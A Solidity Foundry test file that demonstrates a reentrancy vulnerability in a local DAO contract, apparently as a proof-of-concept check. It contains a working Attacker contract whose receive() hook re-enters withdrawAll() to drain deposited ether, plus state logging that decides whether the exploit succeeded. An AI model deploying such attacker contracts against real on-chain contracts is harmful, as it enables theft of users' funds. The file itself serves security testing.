// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import "../src/reentrancy_dao.sol";

contract ReentrancyTest is Test {
    ReentrancyDAO public dao;
    Attacker public attacker;
    address public victim = address(0x123);

    function setUp() public {
        dao = new ReentrancyDAO();
        attacker = new Attacker(address(dao));
    }

    struct DAOState {
        uint contractBalance;
        uint internalAccounting;
        uint attackerCredit;
        uint victimCredit;
        uint totalDeposits;
        uint totalWithdrawals;
        uint attackerBalance;
    }

    function test_withdrawReentrancy() public {
        // Victim deposits 2 ETH
        vm.deal(victim, 2 ether);
        vm.prank(victim);
        dao.deposit{value: 2 ether}();

        // Fund attacker contract for deposit
        vm.deal(address(attacker), 1 ether);

        console2.log("--- BEFORE-Trigger State ---");
        DAOState memory stateBefore = DAOState({
            contractBalance: address(dao).balance,
            internalAccounting: dao.getContractBalance(),
            attackerCredit: dao.getUserCredit(address(attacker)),
            victimCredit: dao.getUserCredit(victim),
            totalDeposits: dao.totalDeposits(),
            totalWithdrawals: dao.totalWithdrawals(),
            attackerBalance: address(attacker).balance
        });

        console2.log("Contract ETH Balance | Before:", stateBefore.contractBalance);
        console2.log("Internal Accounting  | Before:", stateBefore.internalAccounting);
        console2.log("Attacker Credit      | Before:", stateBefore.attackerCredit);
        console2.log("Victim Credit        | Before:", stateBefore.victimCredit);
        console2.log("Total Deposits       | Before:", stateBefore.totalDeposits);
        console2.log("Total Withdrawals    | Before:", stateBefore.totalWithdrawals);
        console2.log("Attacker ETH Balance | Before:", stateBefore.attackerBalance);

        console2.log("--- Trigger Attack ---");
        attacker.attack();

        console2.log("--- AFTER-Trigger State ---");
        DAOState memory stateAfter = DAOState({
            contractBalance: address(dao).balance,
            internalAccounting: dao.getContractBalance(),
            attackerCredit: dao.getUserCredit(address(attacker)),
            victimCredit: dao.getUserCredit(victim),
            totalDeposits: dao.totalDeposits(),
            totalWithdrawals: dao.totalWithdrawals(),
            attackerBalance: address(attacker).balance
        });

        console2.log("Contract ETH Balance | After :", stateAfter.contractBalance);
        console2.log("Internal Accounting  | After :", stateAfter.internalAccounting);
        console2.log("Attacker Credit      | After :", stateAfter.attackerCredit);
        console2.log("Victim Credit        | After :", stateAfter.victimCredit);
        console2.log("Total Deposits       | After :", stateAfter.totalDeposits);
        console2.log("Total Withdrawals    | After :", stateAfter.totalWithdrawals);
        console2.log("Attacker ETH Balance | After :", stateAfter.attackerBalance);

        bool reentrancySuccess = true;

        // Contract lost exactly 1 ETH
        if (stateBefore.contractBalance - stateAfter.contractBalance != 1 ether) {
            console2.log("Problem: Contract ETH balance should decrease by 1 ether");
            reentrancySuccess = false;
        }

        // Internal accounting shows balance of 1 ETH
        if (stateAfter.internalAccounting != 1 ether) {
            console2.log("Problem: Internal accounting should show 1 ETH");
            reentrancySuccess = false;
        }

        // Victim credit remains 2 ETH
        if (stateAfter.victimCredit != 2 ether) {
            console2.log("Problem: Victim's credit changed unexpectedly");
            reentrancySuccess = false;
        }

        // Attacker credit fully drained
        if (stateAfter.attackerCredit != 0) {
            console2.log("Problem: Attacker credit not zeroed");
            reentrancySuccess = false;
        }

        // Attacker gained exactly 1 ETH
        if (stateAfter.attackerBalance - stateBefore.attackerBalance != 1 ether) {
            console2.log("Problem: Attacker ETH gain incorrect");
            reentrancySuccess = false;
        }

        // Final verdict
        if (reentrancySuccess) {
            console2.log("Vulnerability Exists: Reentrancy allows double-withdraw draining contract funds");
        } else {
            console2.log("Vulnerability not Exist: Failed to demonstrate exploitable reentrancy");
        }
    }
}

contract Attacker {
    ReentrancyDAO public dao;
    uint public reentryCount;

    constructor(address _dao) {
        dao = ReentrancyDAO(_dao);
    }

    function attack() public payable {
        // Deposit 1 ETH to gain credit
        dao.deposit{value: 1 ether}();
        // Initiate first withdrawal
        dao.withdrawAll();
    }

    receive() external payable {
        reentryCount++;
        if (reentryCount < 2) {
            // Re-enter during withdrawal execution
            dao.withdrawAll();
        }
    }
}